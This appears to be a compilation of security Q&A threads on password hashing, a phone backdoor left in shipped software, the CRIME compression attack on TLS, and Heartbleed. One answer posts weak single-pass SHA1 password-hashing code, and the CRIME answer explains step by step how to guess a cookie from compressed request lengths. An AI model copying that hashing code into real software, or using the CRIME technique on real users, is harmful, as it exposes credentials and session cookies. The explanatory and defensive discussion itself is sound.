PBKDF2
scrypt


scrypt is new but interesting because it not only uses a variable work factor but also memory-hard functions. This dramatically increases the cost of brute-force attacks, because both running-time and memory requirements are increased.
AnswerKenntnis:
Passwords stored in a database as hashed values can be recovered either through brute-force calculation of the hashes or through use of rainbow tables (which are specific to the algorithm used).

A rainbow table is created as a series of pre-computed values for either a dictionary file or more commonly every combination of a given character set [a-z, A-Z, 0-9] being a common example.

Essentially they can speed up the cracking of a password by allowing the hash value to be looked up in the table rather than requiring the attacker to create the hash for each password. Rainbow tables for common password algorithms (eg, NTLM, MD5, etc) can be found online, making it fairly straightforward to get access to large volumes of them.

There are a number of ways of improving the security of the hashes stored in the database.

First up is to use a per user salt value, this value is stored in the database along with the hashed password.  It isn't intended to be secret but is used to slow down the brute force process and to make rainbow tables impractical to use.

Another add-on I've seen to this is to also add in what was called a pepper value.  This was just another random string but was the same for all users and stored with the application code as opposed to in the database.  the theory here is that in some circumstances the database may be compromised but the application code is not, and in those cases this could improve the security.  It does, however, introduce problems if there are multiple applications using the same password database.

A third means of helping improve the security of the passwords is to use a slow password function, this won't have a huge impact on individual users, but will massively slow down an attacker in cracking passwords retrieved from the database. Some more information on this approach is available here
AnswerKenntnis:
Update 2: In 2013, several experts initiated a Password Hashing Competition which should result in improved and more usable methods, with winners selected by 2015.  For excellent background on the need for that, and good advice in the interim, see Password security: past, present, future from Passwords^12.  Note that the advent of faster and faster hardware (as discussed below) implies the need for memory-intensive algorithms like scrypt, and that bcrypt is also still resistant to GPU attacks unlike PBKDF2 or crypt.



Others here have pointed out that brute force attacks need to be defended against via salts, even though MYSQL still hasn't figured that out.  The importance of iterations has also been noted, and has been known since the seminal paper on Unix crypt in 1978 by Robert Morris and Ken Thompson.  But many people (and developers too, like Django!) evidently still think brute force must take a pretty long time or be pretty expensive.

Not true!  Moore's law and cloud computing has caught up with us.  To crack an alphanumeric password of length 8 ((26+26+10)^8 = 62^8 = 218,340,105,584,896 = 218 trillion combinations) on a modern desktop machine takes 5 days, or 1 hour if you rent a bunch of Amazon compute nodes (How long does it take to actually generate rainbow tables? - IT Security)

Update: bitcoin hashing capacity

The most powerful organized hashing capability on the planet (excluding possible classified systems) is the bitcoin mining network.  It currently is performing SHA-256 hashes at an aggregate rate of over 11 Thash/s, i.e. 11 * 10^12 hash/s, and the rate has been rising quickly recently (graphs).  Miners are working to earn the estimated $700,000 per week that mining yields at the current price of $14 per bitcoin (BTC) (graph), and rate of 50 BTC produced every 10 minutes.  Popular hardware these days includes a Radeon HD 5970 GPU, each of which has a total of 3200 stream processors and can do about 800 Mhash/s.  It  is also thrifty in power consumption at about 2.3 Mhash/Joule.  See Bitcoin mining hardware comparison for lots more options.  It turns out that GPU nodes on Amazon's EC2 use Nvidia Tesla GPUs which are less efficient at hashing, and their nodes aren't cost effective for mining at today's prices.

This is about twice the capacity of one 5.5 Thash/s estimate for the hashing power of the world's top 500 supercomputers combined, though of course the supercomputers were typically designed for floating point performance, not hashing.

As an extreme current case, if this hashing capacity were redirected to trying to crack passwords, e.g. following a crash in bitcoin prices, it would be fearsome against non-iterated password algorithms.  8 character passwords using a completely random assortment of all 94 printing characters would fall in less than 10 minutes (94^8 / (11 * 10^12 * 60) = 9.2).   10 character passwords would take less than 57 days (94^10 / (11 * 10^12 * 3600 * 24) = 56.7).   10-character upper-lower case alphanumeric passwords (26+26+10 = 62 possible characters) would take less than a day (62^10 / (11 * 10^12 * 3600 * 24) = 0.88) even if well randomized.

But if programmers simply used e.g. an iteration count of 2000 as Thomas suggests, good 10-character passwords would last years.  Though 8-character passwords would be easily cracked, within 13 days (2000 * 94^8 / 11 10^12 / 3600 / 24 = 12.8 days).

See also:


Problems with bad algorithms at Brute force vs other methods of recovering passwords from shadow file - IT Security
How to protect against brute forcing at the application/server level
AnswerKenntnis:
Passwords should always be salted and stretched before storing them. Basically this involves appending or prepending some text to the password and hashing the result several times. As for hash algos anything over and above MD5 and SHA-1 is currently advisable - go for SHA 256 or 512 (see http://www.schneier.com/blog/archives/2009/06/ever_better_cry.html)
AnswerKenntnis:
Depending on the algorithm you use the answer is probably no.

First off you should Salt them, this basically means appending or prepending some text to the password.

Then you should use a strong algorithm (md5 doesn't cut it)
AnswerKenntnis:
A good password hashing algorithm must have salt and something to make the calculation of the password expensive (usually iteration count).

The best, and most common, method for this is PBKDF2. Although not perfect, it should be a baseline for everybody:

http://en.wikipedia.org/wiki/PBKDF2
AnswerKenntnis:
Password must always be hashed, but that does not means that there are no possibility for bruteforce-attacks. Additional measures should be applied regarding storage and managing users passwords. I highly recommend this article from Solar Designer about this topic: http://php-security.org/2010/05/26/mops-submission-10-how-to-manage-a-php-applications-users-and-passwords/index.html.
AnswerKenntnis:
I'd second the recommendations for PBKDF2. It's not the most computationally expensive, but it does have a precise standard for reference during implementation, and it's well-accepted.

https://tools.ietf.org/html/rfc2898

I'd really recommend reading Colin Percival's paper on scrypt, though. He does a good job describing the issues in play here. My guess is scrypt will look better and better with time.

http://www.tarsnap.com/scrypt.html

Having an implementable standard is not nothing, by the way - there have been differences between the algorithms described in papers and the reference implementations in both bcrypt and scrypt, if memory serves.
AnswerKenntnis:
It is interesting to note that although bcrypt and scrypt are all good solutions to passwords, with a favor for the latter, scrypt seems to be prone to cache-timing attacks. As suggested here: http://eprint.iacr.org/2013/525 Catena will be safe against this, along with provable safety and a few other nice features.
AnswerKenntnis:
in case of PHP, nowadays, they invented the new password hashing function.
The function allows using various algos, rather than coding these.
Perhaps just a good simplification to most of the PHP Programmers.
Check this out: http://php.net/manual/en/function.password-hash.php
AnswerKenntnis:
I use SHA1 here

def __encrypt(self, plaintext, salt=""):
    """returns the SHA1 hexdigest of a plaintext and salt"""
    phrase = hashlib.sha1()
    phrase.update("%s--%s" % (plaintext, salt))
    return phrase.hexdigest()
def set_password(self, new_password):
    """sets the user's crypted_password"""
    #from datetime import datetime, timedelta  
    import datetime
    if not self.salt:
        self.salt = self.__encrypt(str(datetime.datetime.now()))
    self.crypted_password = self.__encrypt(new_password, self.salt)
def check_password(self, plaintext):
    return self.__encrypt(plaintext, self.salt) == self.crypted_password


Rather than salting passwords like this I would like that the algorithm is changed so that it doesn't need salt and still won't hash the same input twice to the same value.
QuestionKenntnis:
I found that the company I work for is putting a backdoor into mobile phones
qn_description:
I have found out recently that the remote assistant software that we put in a smartphone we sell can be activated by us without user approval.

We are not using this option, and it is probably there by mistake. But the people who are responsible for this system don't see it as a big deal. Because ΓÇ£We are not going to use itΓÇ¥ΓÇª

Am I wrong for going ballistic over it?

What would you do about it if it was your workplace?


  This question was IT Security Question of the Week.
  Read the Jun 16, 2012 blog entry for more details or submit your own Question of the Week.
AnswersKenntnis
AnswerKenntnis:
Just because they won't use it, doesn't mean someone else won't find it and use it. 

A backdoor is a built-in vulnerability and can be used by anyone. You should explain that doing something like this is very risky for your company. What happens when some malicious attacker finds this backdoor and uses it? This will cost your company a lot of time and money to fix. And what will your company say when people ask why the software contained that backdoor in the first place? The company's reputation might be damaged forever. 

This risk is almost certainly isn't worth having it in the code.
AnswerKenntnis:
If you've informed decision-makers and they've decided not to do anything about it, then by definition your company is knowingly shipping a product with a serious security vulnerability. (And, I assume, hiding it from their customers.)  This is a very serious matter.  What's the worst that a malicious person with access to this backdoor could do?  If it's bad enough, I would go to the FBI about it. (Or whoever has jurisdiction over computer security if you're not in the US.)

If your company knows about the problem and doesn't care, then exposing it is the only ethical course of action.  And if they attempt to take retaliatory action against you, you may have legal recourses available, depending on the circumstances and the laws where you live.  (Talk to a lawyer about that if you think it might apply in your case.)
AnswerKenntnis:
If they don't see it as a big deal, you're not asking them the right question.  The question to motivate action on this isn't "is this right?" but "what happens to us when somebody finds and publishes this?"  Whether you're a big or small company, you're looking at serious damage to your reputation and all the bad things that go along with it if someone outside the company discovers this before you fix it.

Fixing this issue isn't just ethical, it's essential for your company's survival.  It's far, far better to fix it quietly now than a week after all your users and customers have left you because it was revealed by some online journalist.
AnswerKenntnis:
Please, pardon my cynicism, but this isn't the first and won't be the last backdoor we see in our legitimate, hardly-earned apps and devices. Just to refresh our memory, we can start from the most recent one, the new Amazon's Big Brother Kindle [1][2].

But we have an entire plethora of backdoored software and services, such as PGP Disk Encryption [3][4], ProFTPD [5] or Hushmail [6], to name a few.

And don't forget the OSes: M$ is always ahead with its NSA_KEY [7][8], but also OpenBSD [9] and the Linux kernel [10] can't be considered 100% safe. We also have paid attempts to gain a backdoor access to Skype by NSA [11], that, however, has been assessed as "architecturally secure" [12].

Moving down to firmware, nowadays we are almost acclimatized in having people from our ISP that are able to watch inside our routers (yes, maybe even see our beloved WPA password), but these [13][14][15] can surely be considered as backdoors too!

Finally, a few considerations on hardware and BIOSes [16], and (this is both funny and somehow dramatic) EULAs [17][18], because also lawyers have their backdoors.

Ok, given this preamble, I'll try to answer to the question briefly. No, you're not wrong getting mad for this thing, but you should focus your anger on the correct motivation. You should be angry because you lost a piece of trust towards the company you work for, not for the fact of the backdoor itself (leave this anger to the customers).

And if I were you, I'll just be very cautious. First, I'll make really really sure that what I saw was a backdoor, I mean legally speaking. Second, I'll try in any way to convince the company to remove the backdoor.

You probably signed a NDA [19] with your company so your question here could be already a violation. However I don't know where the NDA ends and your state law begins (it could be even customer fraud), and probably, due to the technicality of the subject only a highly specialized lawyer could help you with this matter. So, if you want to proceed, before doing anything else, even talking to the authorities, you should hire a very skilled lawyer and be prepared to lose a lot of time and money, or even the job.
AnswerKenntnis:
You should seriously consider going to some governmental or regulatory authority with this, just to protect yourself.

Imagine this scenario:


You inform management about the backdoor.  Now they know you know.
Evil Hacker ZmEu finds out about the backdoor, and puts something on pastebin.
Your management finds out about Evil Hacker ZmEu's pastebin.
Your management blames you, and fires you for cause, over your protestations of innocence.


Most security vulnerabilities get discovered multiple times.  You won't be the only one to find it, you'll just be the most obvious one to make a scapegoat of.
AnswerKenntnis:
It's ok, people will still buy the iPhones your company makes - your secret is safe. ;)

If it was my workplace, where I'm employed as a security analyst, I'd accept that my job is to identify and communicate risk; it's up to the business to accept the risk.  I can not accept risk personally, so my only real option is to ensure that I've communicated the level of risk in the proper forum to the best of my ability.  So, if you are employed at a level where you can accept risk, then it's up to you to decide whether or not this is OK.  Based on the post, however, you are not at a level where you can accept risk on behalf of the company.  So all you can probably do is communicate the risk in a way that the business area can understand, and then let the business area make an appropriate business decision using all of the information available to them.

The thing you do have control over is accepting the risk to yourself posed by working for a company which makes decisions which you think are bad.  Your available means of mitigating that risk are documented at Monster.com and friends. :)
AnswerKenntnis:
Before the smartphone area it was a standard feature of all mobile phone to have backdoors. The GSM protocol allowed the base station to update the phone software.
http://events.ccc.de/congress/2009/Fahrplan/events/3654.en.html is a good talk about how crazy the security scheme has been.

As far as I know no one of the companies involved in creating GSM got into any legal trouble about the affair.
Government agencies like the NSA liked the fact that they had backdoors. At the moment there are people inside the government that want to mandate backdoors for every communication platform.

I think there a good chance that the backdoor exist because some other entity like the NSA wants it to be there. If people higher up in your company made a deal with the NSA they probably won't tell you when you come them to complain about the backdoor.

For all you know it could be the Mossad that's paying your company to keep the backdoor in the software.

A clear backdoor into a modern smartphone is probably worth 6 figures or more on the black market. An employee could sell it or could have been specifically payed to put it there. 

On the other hand if the backdoor really just exists because the higher ups in your company are to ignorant than you might be able to explain to them it it's a serious issue.
AnswerKenntnis:
You have a professional responsibility and an ethical responsibility to ensure this is addressed, IMO.  And you've stepped into a minefield.  Protect yourself.  Watch your step.  Go slow.  Think defense-in-depth.  I successfully solicited a whistleblower, who has been able to maintain anonymity.  The solicitation included advice on maintaining anonymity; take a look.  
Check you're not re-blowing the whistle on something already known - like the Carrier IQ stuff.  
Sending written notification to corporate counsel could go a long way to getting the problem addressed - e.g. via an anonymous email account so you can have 2-way communication. 
Also: 
Look at archives of the now-dead Wikileaks:Submissions page I referenced.

Whistleblower.org has good info for you, even though it's government-focused.  

Addendum: Have you looked through the source code version control logs to see who put the backdoor in?
AnswerKenntnis:
Treat it as a security vulnerability you have discovered and report it to to, for example, CVE.  Anonymously if you wish.
AnswerKenntnis:
Your reaction is sound, and on a gut instinct level means that you care about one or more of: your customers' privacy, your company's public image, your codebase's quality, your own skin.

In my workplace, I would be senior enough to know it a security bug (and not there by company intent, or mandate from the government) - and remove it. It sounds like this doesn't apply in your case, though.

If you can trace "we are not going to use it" to "we put it there for our own use, but don't need it" you can probably describe to someone high enough in the organization the dangers it poses to the company when it shows up on bugtraq / gets used for nefarious purposes by some third party, which is likely to happen if your smartphone is popular, common and valuable enough (as a target - which may translate to "used by important enough people") to attack.

If you can trace it to "it's there by government mandate" or similar, you might want to insist on internal documentation to that effect, so you can at least leave it be and know that you've done what you can to protect your company, and save other skilled coworkers of yours from the dilemma you find yourself in, as a matter of good code maintenance practices. (And ponder your options about working in an industry making tools that both serve and sacrifice their owners, if this feels deeply demotivational.)
AnswerKenntnis:
You have a known security vulnerability, and your company is only one of an infinite number of parties which could exploit it. Any exploit of that hole, by any party, could reasonably result in a liability the scale of Sony's after the root kit fiasco. Their cost in both dollars and reputation soared into the hundreds of millions of dollars, in a directly analogous situation.

Make the case by drawing direct parallels to Sony, with your user base in ratio to Sony's as a gauge to calculate potential liability when this hole is exploited.
AnswerKenntnis:
It's ok to worry about it, don't worry, your reaction is normal ^^

I would do one of two things:


I would update the user agreement explaining that this possibility exists, therefore asking for the user's consensus (if the people in charge really don't want to take the backdoor away)
I would remove the backdoor completely (better option in my opinion)


Also, if it is true that this backdoor is never used, why leave it there?
AnswerKenntnis:
OP: You know what happened in the case of ZTE? Go on pastebin, make a full and comprehensive security advisory. Needless to say, cover your tracks. That's that, if you were unsure to the point that you asked the question here, you can benefit us all by making the advisory.
AnswerKenntnis:
I would seriously counsel against immediate whistleblowing. Not least because there's a good chance this happens because someone from the CIA/FBI had a little chat with the head of the company who ordered it to happen through trusted management channels, and that's why it happens even though everyone should recognise that it's a shitty excuse. 

You are rightfully recognising this as a shitty excuse. The problem is that other people also should have. Somewhere someone with power must have decided that this would happen. The construct that it's "OK because we won't use it" is then perpetuated. 

That means that if you whistleblow (and get sacked) and launch a lawsuit, not only a) might you find it very difficult to get another job, b) your lawsuit might not go anywhere because it could turn out (hey, I'm not a lawyer, but it's plausible) that it wouldn't be recognised as "misconduct" by the firm. If I was the federal government I would go to greath lengths to protect people doing my dirty deeds.

On the other hand, if you have a trust fund and want to catapult yourself to 15-minute fame, you can go public about it. Just have an alternative path staked out in "Alternative Computing" or the Free Software Movement. There's no private jet down that route. 

What I advise is getting a decent amount of details on it, finding new employment, then anonymously contacting a security profile and saying you want to go public/whistleblow it through them. The first person you contact will probably comply. The company might try to go after you but they SHOULD have no definite proof from any logs or search warrants and it's not "official" in the sense that new employers would be forced to recognise it.
AnswerKenntnis:
As mentioned elsewhere what would scare me would be usage of the interception functionality even without any bad intention of its original developers/installers. The so-called "Athens Affair" comes immediately to mind and underlines this concern. For a technically informative and in the same time exciting read you can check:

The Athens Affair: How some extremely smart hackers pulled off the most audacious cell-network break-in ever
AnswerKenntnis:
This was reported earlier this week in China's ZTE Ships Smartphone with Backdoor to MetroPCS, but finally some are seeing it. It seemed to have gone un-noticed by many...
AnswerKenntnis:
It's probably there to allow government agencies to access your cell phone and listen in on whatever you're doing at the time. It's required by law.

See:


Remotely activated mobile phone microphones (Wikipedia)
Remotely Eavesdropping on Cell Phone Microphones (Published 2006-12-05)
AnswerKenntnis:
Well what you really should be after is their motives for putting in a backdoor. As the highest voter has said, just because you wont use it does not mean it won't be found. If it were me I'd find out what the motive is behind said backdoor, anonymously alert a major tech publication about said backdoor. Then again this depends on whether you feel a responsibility towards the general public or whether you feel it's up to the company to clean up their own act and let someone else hold them to account for their misdeeds.
AnswerKenntnis:
It really depends on the nature of the back door. Is it worse than Carrier IQ?

I know the cell phone carrier can intercept all my voice and data transmissions and turn them over to the government.  In fact, the NSA can intercept it all, too.  I also expect the carrier and phone manufacture can, if given physical access to the phone, completely read all the data on it without my approval.  So if the back door is limited to these kinds of things and you personally cannot use the back door to get into someone else's phone due to some other security constraint, then I would not get too bent out of shape about it.  Raise your concerns to your supervisor in an email and save a copy of it on paper at home.

Now if it is the kind of back door a hacker can use to steal passwords saved on the smart phone without being detected, that's time to go full whistleblower if you cannot get them to lock that down.  Access to a customer's phone should require specific security authorization within the company combined with full logging so that people who abuse their security privileges can be identified and have those privileges revoked (at the very least).  

If it is somewhere in between, well, maybe leak it to a security researcher....
AnswerKenntnis:
IF you have signed a "non-disclosure agreement" on the type of work and products you are dealing with your company then you shouldn't even be asking this question or posting it here. If not, you can post your company name and the software installed in phones to alert everyone.
AnswerKenntnis:
Hmm, by posting it here after alerting them I'd say that you should think about actually going public because you kind of already have.

Backdoors are pretty commonplace in emerging technologies as it usually takes legislation a while to catch up. Also, the development communities are not fully converged. For instance the Internet was notoriously unsafe until ISPs had to build in direct access to government bodies via legislation, licensing and exchanges. Only then security became important as the 'right' people had secured all the access they needed.

If it were my workplace I'd STFU... But it might be a bit late for that.
AnswerKenntnis:
Of course the back door didn't appear there without serious forethought. National security agencies are involved, and they paid to have it done, hopefully without anyone noticing. Cellular engineers designed in the capability to turn on a cellular microphone without the owner knowing it (keeping indicator lights off). I expect GPS locations can be broadcast even when an owner has the GPS feature turned off, and pictures can be taken and broadcast without the owner knowing it as well.
QuestionKenntnis:
CRIME - How to beat the BEAST successor?
qn_description:
With the advent of CRIME, BEAST's successor, what possible protection is available for an individual and/or system owner in order to protect themselves and their users against this new attack on TLS?
AnswersKenntnis
AnswerKenntnis:
This attack is supposed to be presented 10 days from now, but my guess is that they use compression.

SSL/TLS optionally supports data compression. In the ClientHello message, the client states the list of compression algorithms that it knows of, and the server responds, in the ServerHello, with the compression algorithm that will be used. Compression algorithms are specified by one-byte identifiers, and TLS 1.2 (RFC 5246) defines only the null compression method (i.e. no compression at all). Other documents specify compression methods, in particular RFC 3749 which defines compression method 1, based on DEFLATE, the LZ77-derivative which is at the core of the GZip format and also modern Zip archives. When compression is used, it is applied on all the transferred data, as a long stream. In particular, when used with HTTPS, compression is applied on all the successive HTTP requests in the stream, header included. DEFLATE works by locating repeated subsequences of bytes.

Suppose that the attacker uses some JavaScript code which can send arbitrary requests to a target site (e.g. a bank) and runs on the attacked machine; the browser will send these requests with the user's cookie for that bank -- the cookie value that the attacker is after. Also, let's suppose that the attacker can observe the traffic between the user's machine and the bank (plausibly, the attacker has access to the same LAN of Wi-Fi hotspot than the victim; or he has hijacked a router somewhere on the path, possibly close to the bank server).

For this example, we suppose that the cookie in each HTTP request looks like this:


  Cookie: secret=7xc89f+94/wa


The attacker knows the Cookie: secret= part and wishes to obtain the secret value. So he instructs his JavaScript code to issue a request containing in the body the sequence Cookie: secret=0. The HTTP request will look like this:

POST / HTTP/1.1
Host: thebankserver.com
(...)
Cookie: secret=7xc89f+94/wa
(...)

Cookie: secret=0


When DEFLATE sees that, it will recognize the repeated Cookie: secret= sequence and represent the second instance with a very short token (one which states "previous sequence has length 15 and was located n bytes in the past); DEFLATE will have to emit an extra token for the '0'.

The request goes to the server. From the outside, the eavesdropping part of the attacker sees an opaque blob (SSL encrypts the data) but he can see the blob length (with byte granularity when the connection uses RC4; with block ciphers there is a bit of padding, but the attacker can adjust the contents of his requests so that he may phase with block boundaries, so, in practice, the attacker can know the length of the compressed request).

Now, the attacker tries again, with Cookie: secret=1 in the request body. Then, Cookie: secret=2, and so on. All these requests will compress to the same size (almost -- there are subtleties with Huffman codes as used in DEFLATE), except the one which contains Cookie: secret=7, which compresses better (16 bytes of repeated subsequence instead of 15), and thus will be shorter. The attacker sees that. Therefore, in a few dozen requests, the attacker has guessed the first byte of the secret value.

He then just has to repeat the process (Cookie: secret=70, Cookie: secret=71, and so on) and obtain, byte by byte, the complete secret.



What I describe above is what I thought of when I read the article, which talks about "information leak" from an "optional feature". I cannot know for sure that what will be published as the CRIME attack is really based upon compression. However, I do not see how the attack on compression cannot work. Therefore, regardless of whether CRIME turns out to abuse compression or be something completely different, you should turn off compression support from your client (or your server).

Note that I am talking about compression at the SSL level. HTTP also includes optional compression, but this one applies only to the body of the requests and responses, not the header, and thus does not cover the Cookie: header line. HTTP-level compression is fine.

(It is a shame to have to remove SSL compression, because it is very useful to lower bandwidth requirements, especially when a site contains many small pictures or is Ajax-heavy with many small requests, all beginning with extremely similar versions of a mammoth HTTP header. It would be better if the security model of JavaScript was fixed to prevent malicious code from sending arbitrary requests to a bank server; I am not sure it is easy, though.)



Edit 2012/09/12: The attack above can be optimized a bit by doing a dichotomy. Imagine that the secret value is in Base64, i.e. there are 64 possible values for each unknown character. The attacker can make a request containing 32 copies of Cookie: secret=X (for 32 variants of the X character). If one of them matches the actual cookie, the total compressed length with be shorter than otherwise. Once the attacker knows which half of his alphabet the unknown byte is part of, he can try again with a 16/16 split, and so on. In 6 requests, this homes in the unknown byte value (because 26 = 64). If the secret value is in hexadecimal, the 6 requests become 4 requests (24 = 16). Dichotomy explains this recent twit of Juliano Rizzo.



Edit 2012/09/13: IT IS CONFIRMED. The CRIME attack abuses compression, in a way similar to what is explained above. The actual "body" in which the attacker inserts presumed copies of the cookie can actually be the path in a simple request which can be triggered by a most basic <img> tag; no need for fancy exploits of the same-origin-policy.
AnswerKenntnis:
To add to Thomas Pornin's outstanding answer, I wanted to point out some prior work on the subject of compression and cryptography.  Take a look at the following research paper:


John Kelsey.  Compression and Information Leakage of Plaintext.  FSE 2002.


That paper describes chosen-plaintext attacks against systems that (a) compress data before encrypting it, and (b) where an eavesdrop can observe the length of the resulting ciphertexts.

The attacks that are conceptually vaguely similar to what Thomas Pornin describes.  The paper even mentions that TLS uses optional compression before encryption.  However, at the time I don't think anyone realized that this enables an attack on HTTP over TLS, or that an attacker could learn the value of secret cookies sent over a TLS-encrypted connection.  The paper looks at attacks on compression mainly in the abstract, rather than in the specific context of the web, and is pretty theoretical.  So, CRIME (or Thomas Pornin's attack) is still a significant novel extension of these ideas.

Nonetheless, this is an interesting paper that anticipates the general sort of attack at issue here, even if it did not realize the consequences for web security.  It is interesting that the general sort of issue was first described in the research literature 10 years ago, yet it took that long for the security community to fully appreciate the practical consequences of this work.  Crypto sure ain't easy, is it?
AnswerKenntnis:
Just to add to great Thomas answer, it seems that to successfully leak the cookie value the actual POST body sent should not only be the:

Cookie: secret=....


but should contain much more text from the POST header, like so:

POST / HTTP/1.1
Host: thebankserver.com
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1
Accept: */*
Referer: https://thebankserver.com/
Cookie: secret=...


This POST contents can be easily constructed with Javascript (e.g. he will retrieve user agent via navigator object), so that is not a problem in the attack scenario.

In practice, attacker can mutate the body even more, e.g. by putting the cookie value multiple times, putting multiple Cookie headers, using only parts of the POST headers in the body etc.

Based on @xorninja code I've constructed the adaptive algorithm that duplicates the whole request header in the body, and tries to shorten it iteratively if the results for the next cookie character are unclear. Results are promising, at least 8 characters are detected now.. When no character can be detected this way, the request body is shortened by removing one header and the process continues. It can successfully leak arbitrary cookie values. Feel free to improve.
QuestionKenntnis:
How to explain Heartbleed without technical terms?
qn_description:
Most of my friends who are not experienced in computers want to know what Heartbleed is and how it works. How would one explain Heartbleed to someone without a technical background?
AnswersKenntnis
AnswerKenntnis:
The analogy of the bank and bank employee

You call the bank to request a new bank account, to make an appointment - whatever. Somehow you and the bank make sure that you are who you are, and the bank is actually the bank. This is the TLS process that secures the connection between you and the bank, and we assume this is handled properly. 

The roles in this play


The bank: a webserver
The bank employee: the OpenSSL service for that server 
You (the bank robber): a bot fetching all it can get from that server


Staying connected - the heartbeat

A bank employee answers your call. You request some information. The employee says to wait a minute and disables his microphone. He can hear you, you cannot hear him. Then it's quiet. For a long time. You start to wonder if he hung up. So you say "hello?" The employee is instructed to echo whatever you say, and replies with "hello". This is the heartbeat to check if there is still a connection. 

Now with this peculiar bank employee, you need to say first how many words you are going to use before you ask if the employee is still online. So instead of saying "hello", you need to say "one: hello", or "two: hello there". The employee now knows he can reply with repeating those (first) two words, and then can continue to work on your request. This is the heartbeat protocol. 

The problem - the heartbleed - no check on what is returned 

OK, you're bored, and you make a joke. You say "thousand: hello". The employee doesn't check that you only said one word (hello), and starts to reply with "hello" plus then the next 999 words that he says, or thinks about, or has in memory, before putting the mic off. This is the bug that causes the problem. 

Those 999 words are unrelated. Most of it will be useless, remarks about the weather, request for coffee, lunch appointments etc. Some of it can be important information about the bank or other customers. A transport of gold, a customer is going to bring in $1m, the code for entering the bank or the safe, etc. 

There is no check if there are actually 1000 words to be replied. Plus you can do this request over and over again - the employee won't complain and nobody else is going to notice what is going on. 

There is one limit. You will only get information from this one bank employee, and only the stuff he talks or thinks about. Other employees are not affected. You cannot see what is on his desk or in his rolodex. (Analogy: only data in memory (RAM) is at risk; data on the harddisk which is not read into memory, and data from other programs and processes is safe.)

Doing this you don't know what information you will get, but doing it for a long time over and over again, you will get enough information to finally be able to break in without anyone noticing it. You can enter the bank after hours, open the safe, etc. This is the risk involved. 

The solution - check request and renew codes

If the employee would think for a moment he would only reply with one word and then disable the microphone so you cannot hear anymore what he is discussing. By making this check, you will stay connected and know that the employee has not hung up, but will not hear any random info anymore. In effect the employee needs new instructions on what to echo. This is fixed with the update to the latest version of OpenSSL. 

The bank will have to renew security keys for entering the bank and safe, because it is unknown whether someone has the old codes.
AnswerKenntnis:
How about this one from XKCD?



The most "non-technical" explanation I found.
AnswerKenntnis:
I'm going to have to use a few technical terms, but will try to keep them to a minimum and describe them.

Basic Intro to TLS & Encryption

You (a client) go to a website (known as a server) that uses encryption (the address starts with https://) to make it so no one but you and the website at the other end can know the content of the messages you are sending or receiving.  So when your messages are transported across computers on the internet they are encrypted -- they call this transport layer security (TLS) and it is one type of encrypted protocol.  One library that implements TLS is OpenSSL (TLS is the newer name for SSL, but both have the same intention -- encrypt network traffic on the internet). 

What is Heartbeat - the compromised TLS feature?

To set up a TLS connection there's a negotiation that's relatively expensive (it takes time).  Several messages have to be exchanged between the client and server before they can trust each other and safely send encrypted data back and forth. To have a quick and responsive experience (and minimize server load), you want to perform this negotiation rarely when possible, rather than do it before every single request (as you often will perform hundreds of requests in minutes with modern interactive websites).   Complicating matters, packets on the internet often get lost or corrupted.  The server may be overwhelmed with too many requests and need to drop its end of the TLS connection.  Or the client may have closed its browser window, so the server has no need to continue storing its end of the encrypted connection.

So in 2012 a proposal was implemented in OpenSSL (called Heartbeats) to send "keep-alive" messages between client and server to reduce the number of negotiations, when both ends still are using the connection.  The client asks the webserver periodically "Are you still there?" and the webserver (if it is still there), replies telling whether or not it is still there or whether future requests need a new TLS negotiation.

How the Heartbeat Extension works

The client sends a Heartbeat message consisting of a payload chosen by the client, as well as a brief header containing the size of the payload.  E.g., you could send a Heartbeat request of size 18 and text This is my payload (though generally it will be randomly chosen data).  The webserver gets that request, saves the content of the payload to the memory of the webserver, as well as the saving the size of the payload 18 that the client told it.

Then when the server sends a "keep-alive" response back to the client, the library reads those next 18 characters of memory starting from where it stored the payload and sends it back to the client (who checks that they received the right data back) and then the connection is kept alive. 

The Heartbleed flaw in OpenSSL

The fatal flaw (that has been named Heartbleed) is that the OpenSSL library never checked that the Heartbeat payload size corresponds with the actual length of the payload being sent.  A user is allowed to input any number up to 65535 (64 kilobytes) regardless of the true size of the payload.  If an attacker sends a Heartbeat request saying the size is 65535, but a payload that's only 18 bytes long the vulnerable server will store only 18 bytes in memory.  However, the response will start with those stored 18 bytes, but continue sending data from the next 64KB of memory back to the client.  This data could be usernames and passwords, private keys, username, HTML pages, random junk, or even the private secret that the webserver uses to establish its identity.   (The fix to OpenSSL implemented in 1.0.1g and later versions is essentially to perform sanity checks on the payload size as told by the client).

The attack can be repeated many times and in general will reveal different parts of the webserver's memory each time.  The attack can be performed anonymously in an undetectable manner for typical webserver configurations.  Typically, you only log IP addresses when you serve a web page, but this attack can happen early in the negotation process in vulnerable versions, before any webpage is served.

Attack on Clients

There is also a reverse version of this, where a user connecting to a malicious TLS server will trust the keep-alive request sent from a malicious server where the server lied about the size of its keep-alive payload.  This would cause the web browser to leak up to 64KB of information to the webserver.  (Granted this would be much harder to get usable information out of it and cannot be done anonymously and must be initiated by the client choosing to go to that webpage.  However, it still makes sense to patch OpenSSL quickly if you browse the web with an affected version.)

Remedy

The remedy for clients and servers that use OpenSSL is to update it.  System administrators running webservers that used the vulnerable OpenSSL library need to revoke their secret TLS keys and generate new ones (as well as invalidate long lived session tokens).  Clients should change their passwords on affected websites, which may have been leaked.   For clients, lastpass released a heartbleed checker tool that tests whether a site is (1) currently vulnerable, (2) previously tested to be vulnerable, or (3) likely vulnerable (using a unix/linux webserver and TLS, likely indicating use of OpenSSL which is primarly used on unix/linux systems) which may help determine whether you need to update your password at a given website.

SSH is not TLS so SSH keys are safe

SSH (which stands for Secure Shell) is a common tool on unix and linux machines, allowing users to remotely login to a machine and issue commands that are transported over the network encrypted.  SSH is an entirely different protocol from TLS (the answer says SSL, but that's just the old name for TLS -- the terms are often used interchangeably).  Even though OpenSSH (the most common implementation of SSH) and OpenSSL have similar names, your SSH keys are not vulnerable due to the Heartbleed attack.  

Only memory from the process that is doing the TLS encryption can be leaked through the Heartbleed attack. (A process is the computing term for a running instance of an application.) Modern operating systems implement process isolation that prevent processes from reading or writing memory assigned to other processes on the same system.  So contrary to xkcd.com/1353 you do not need to worry about all of your computer's memory being compromised, just the memory of the webserver process (or the webbrowser for the reverse form).  Secrets like SSH keys used by other processes (ssh, sshd, ssh-agent) are not being leaked because you also used TLS in a webserver.

